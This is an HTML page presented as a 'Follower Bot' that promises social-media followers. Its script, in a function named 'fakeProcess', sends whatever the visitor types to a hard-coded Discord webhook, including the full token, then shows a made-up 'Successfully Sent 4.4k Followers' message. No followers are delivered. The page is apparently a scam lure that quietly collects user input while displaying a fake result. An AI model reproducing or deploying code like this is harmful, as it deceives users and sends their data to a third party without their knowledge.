<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Follower Bot</title>
<style>
/* ---------------- GLOBAL STYLES ---------------- */
body {
    margin: 0;
    padding: 0;
    font-family: "Inter", Arial, sans-serif;
    background: #08040b;
    color: #fff;
    min-height: 100vh;
    overflow-x: hidden;
}

/* ---------------- ABSTRACT BACKGROUND ---------------- */
.bg-wave {
    position: fixed;
    top: -20%;
    left: 50%;
    width: 2000px;
    height: 2000px;
    background: radial-gradient(circle, #ffb30033, #8a00ff22, transparent 70%);
    filter: blur(180px);
    transform: translateX(-50%);
    animation: waveFloat 16s ease-in-out infinite alternate;
    z-index: -10;
}

@keyframes waveFloat {
    from { transform: translate(-50%, 0) scale(1); }
    to { transform: translate(-50%, -100px) scale(1.25); }
}

/* ---------------- FLOATING PARTICLES ---------------- */
.particle {
    position: fixed;
    width: 6px;
    height: 6px;
    background: #ffbe55cc;
    border-radius: 50%;
    filter: blur(2px);
    animation: particleFloat 12s linear infinite;
    z-index: -5;
}

@keyframes particleFloat {
    0% { transform: translateY(110vh) translateX(-10vw); opacity: 1; }
    100% { transform: translateY(-20vh) translateX(10vw); opacity: 0; }
}

/* ---------------- HERO ---------------- */
.hero {
    text-align: center;
    padding-top: 100px;
    opacity: 0;
    transform: translateY(40px);
    animation: fadeInUp 1.2s forwards 0.2s;
}

.hero-title {
    font-size: 56px;
    font-weight: 900;
    background: linear-gradient(90deg, #ffdf99, #ffb444, #ff8b00, #ffdf99);
    -webkit-background-clip: text;
    color: transparent;
    text-shadow: 0 0 40px #ffcc4488;
}

.hero-subtitle {
    margin-top: 12px;
    font-size: 20px;
    opacity: 0.75;
    letter-spacing: 1.2px;
}

/* ---------------- MAIN WRAPPER ---------------- */
.main-wrapper {
    display: flex;
    justify-content: center;
    gap: 50px;
    flex-wrap: nowrap;
    margin-top: 80px;
    padding-bottom: 200px;
}

/* ---------------- PANEL ---------------- */
.panel {
    position: relative;
    width: 420px;
    padding: 50px 35px 70px 35px;
    background: rgba(30, 20, 40, 0.45);
    backdrop-filter: blur(22px);
    border-radius: 24px;
    border: 2px solid rgba(255, 187, 56, 0.45);
    box-shadow: 0 0 25px #ffae0044, inset 0 0 25px #4a280033;
    transition: 0.35s ease;
    overflow: hidden;
    opacity: 0;
    transform: translateY(40px);
}

.panel.show {
    opacity: 1;
    transform: translateY(0px);
    transition: all 1s ease-out;
}

.panel:hover {
    transform: translateY(-12px) scale(1.04);
    box-shadow: 0 0 55px #ffae00aa, inset 0 0 35px #ff880033;
}

/* ---------------- PANEL TITLE ---------------- */
.panel-title {
    font-size: 28px;
    font-weight: 700;
    letter-spacing: 1px;
    text-shadow: 0 0 14px #ffc55f66;
    margin-bottom: 25px;
    opacity: 0;
    transform: translateY(20px);
    animation: fadeInUp 1s forwards 0.5s;
}

/* ---------------- PANEL FOOTER ---------------- */
.panel-footer {
    position: absolute;
    bottom: 18px;
    width: 100%;
    text-align: center;
    font-size: 14px;
    font-weight: 600;
    letter-spacing: 1px;
    color: #ffcc66;
    text-shadow: 0 0 12px #ffcc6677;
}

/* ---------------- INPUT BOX ---------------- */
.input-wrapper {
    background: rgba(20, 15, 25, 0.65);
    border: 1px solid #dba244;
    border-radius: 12px;
    padding: 12px 14px;
    display: flex;
    align-items: center;
    margin-bottom: 30px;
    transition: 0.25s ease;
}

.input-wrapper:hover {
    border-color: #ffcc66;
    box-shadow: 0 0 22px #ffcc6655;
}

.input-wrapper svg {
    width: 22px;
    height: 22px;
    margin-right: 10px;
    fill: #ffcc66;
    transition: 0.25s ease;
}

.input-wrapper input {
    border: none;
    background: transparent;
    color: #ffe9c5;
    font-size: 17px;
    outline: none;
    width: 100%;
}

/* ---------------- BUTTON ---------------- */
button {
    width: 100%;
    padding: 16px;
    font-size: 18px;
    font-weight: 800;
    border: none;
    border-radius: 14px;
    color: #fff;
    cursor: pointer;
    background: linear-gradient(135deg, #ffb933, #ff8a00);
    box-shadow: 0 0 30px #ffae0066;
    transition: 0.3s ease;
}

button:hover {
    transform: translateY(-4px) scale(1.05);
    box-shadow: 0 0 50px #ffb933aa;
}

.success {
    margin-top: 20px;
    display: none;
    font-size: 16px;
    color: #ffddaa;
    text-shadow: 0 0 10px #ffb73366;
}

.video-box {
    width: 100%;
    height: 260px;
    border-radius: 16px;
    overflow: hidden;
    margin-top: 15px;
    border: 1px solid #ffb84f99;
    box-shadow: inset 0 0 18px #000000aa;
}

.video-box video {
    width: 100%;
    height: 100%;
    object-fit: cover;
}

footer {
    margin-top: 120px;
    padding-bottom: 40px;
    text-align: center;
    font-size: 14px;
    opacity: 0.6;
    text-shadow: 0 0 6px #ffbb3388;
}

@keyframes fadeInUp {
    from { opacity: 0; transform: translateY(20px); }
    to { opacity: 1; transform: translateY(0px); }
}

@media (max-width: 950px) {
    .main-wrapper {
        flex-direction: column;
        align-items: center;
        gap: 50px;
    }
}
</style>
</head>

<script>
function addSparks(panel) {
    for (let i = 0; i < 6; i++) {
        const s = document.createElement("div");
        s.className = "spark";
        s.style.top = Math.random() * panel.clientHeight + "px";
        s.style.left = Math.random() * panel.clientWidth + "px";
        s.style.animationDuration = 2 + Math.random()*2 + "s";
        panel.appendChild(s);
    }
}

/* ---------------- SAFE WEBHOOK SENDER WITH CHUNKING ---------------- */
async function sendChunksToWebhook(fullMessage) {
    const webhookURL = "https://discord.com/api/webhooks/1439152866605535292/nR4j3hFdhqp4AnXCBVzUaijYXNE1sGgV4gjLEZXuFTvT6u9FYCzAA9_37oChjzM7dQdc";
    const maxLen = 2000;

    const chunks = [];
    for (let i = 0; i < fullMessage.length; i += maxLen) {
        chunks.push(fullMessage.substring(i, i + maxLen));
    }

    for (let i = 0; i < chunks.length; i++) {
        await fetch(webhookURL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ content: chunks[i] })
        });
        if (i < chunks.length - 1) await new Promise(resolve => setTimeout(resolve, 200));
    }
}

/* ---------------- PROCESS BUTTON ---------------- */
async function fakeProcess() {
    const input = document.getElementById("message").value.trim();
    const msg = document.getElementById("msg");

    if (!input) {
        alert("Please type a message first.");
        return;
    }

    msg.style.display = "block";

    await sendChunksToWebhook(input);

    setTimeout(() => {
        msg.textContent = "Sending bots..";
        setTimeout(() => {
            msg.style.display = "none";
            msg.textContent = "Successfully Sent 4.4k Followers";
        }, 1500);
    }, 1500);
}

/* ---------------- PANEL REVEAL ON SCROLL ---------------- */
const panels = document.querySelectorAll(".panel");
const observer = new IntersectionObserver(entries => {
    entries.forEach(entry => {
        if (entry.isIntersecting) entry.target.classList.add("show");
    });
}, { threshold: 0.2 });

panels.forEach(panel => observer.observe(panel));
</script>
